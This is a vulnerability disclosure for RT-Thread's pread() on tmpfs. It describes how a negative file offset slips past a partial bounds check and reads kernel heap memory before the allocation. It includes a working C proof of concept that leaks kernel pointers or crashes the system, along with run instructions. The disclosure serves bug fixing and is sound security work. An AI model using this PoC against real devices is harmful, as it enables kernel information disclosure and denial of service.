# Vulnerability 3: `pread()` Negative-Offset Out-of-Bounds Heap Read

Issue: [RT-Thread/rt-thread#11737](https://github.com/RT-Thread/rt-thread/issues/11737)
Target: RT-Thread master `6ea6827`, bsp/qemu-vexpress-a9, default configuration
Repro: `qemu-system-arm -M vexpress-a9 -kernel rtthread.elf -sd sd.bin -nographic`

## Description

`rw_verify_area()` in `components/dfs/dfs_v2/src/dfs_file.c` (:246-250)
rejects a negative file position only **partially** — it returns
`-EOVERFLOW` only when `count >= -pos`; a negative offset with
`count < |offset|` falls through, and `dfs_file_pread()` (:1037-1054)
passes the negative `off_t` straight into the filesystem read operation.
The tmpfs read path `dfs_tmpfs_read()` (:298-305) computes the length with
signed arithmetic (`size - *pos` is inflated) and then executes
`memcpy(buf, &d_file->data[*pos], length)` — reading from **in front of**
the heap allocation: a kernel heap information disclosure, or a
wild-pointer crash for large offsets. (The elmfat read path is not
affected thanks to its unsigned guard at `dfs_elm.c:578`.)

Reproduced result A: `pread(fd, buf, 32, -64)` returns 32 bytes of heap
metadata that are **not file content** — kernel pointers (`0x600b8520`,
`0x600b7440`), allocator chunk sizes (`0x110`, `0xc0`), and remnants of
other heap strings.

Reproduced result B: `pread(fd, buf, 32, -10000000)` → **data abort**.

## Screenshot

![pread heap info leak](https://raw.githubusercontent.com/REYu6/rt-thread-poc-evidence/main/pread_leak.png)

![pread wild pointer crash](https://raw.githubusercontent.com/REYu6/rt-thread-poc-evidence/main/pread_crash.png)

## PoC

```c
static void poc_pread(int argc, char **argv)
{
    long off = -64;
    int fd, i;
    char buf[40];
    long n;

    if (argc > 1) off = atol(argv[1]);
    fd = open("/tmp/leak.txt", 2 /*O_RDWR*/ | 0x200 /*O_CREAT*/, 0777);
    if (fd < 0) { rt_kprintf("[poc] open failed fd=%d errno=%d\n", fd, (int)rt_get_errno()); return; }

    write(fd, "AAAABBBBCCCCDDDD", 16);
    rt_memset(buf, 0, sizeof(buf));
    rt_kprintf("[poc] pread(fd, buf, 32, %ld) on tmpfs file ...\n", off);
    n = pread(fd, buf, 32, off);
    rt_kprintf("[poc] pread returned %d bytes:", (int)n);
    for (i = 0; i < 32; i++) rt_kprintf(" %02x", (unsigned char)buf[i]);
    rt_kprintf("\n[poc] done\n");
    close(fd);
}
MSH_CMD_EXPORT(poc_pread, pread negative-offset OOB read demo: poc_pread [offset]);
```

Run `poc_mount` first (mounts tmpfs), then `poc_pread -64` (info leak) or
`poc_pread -10000000` (crash).
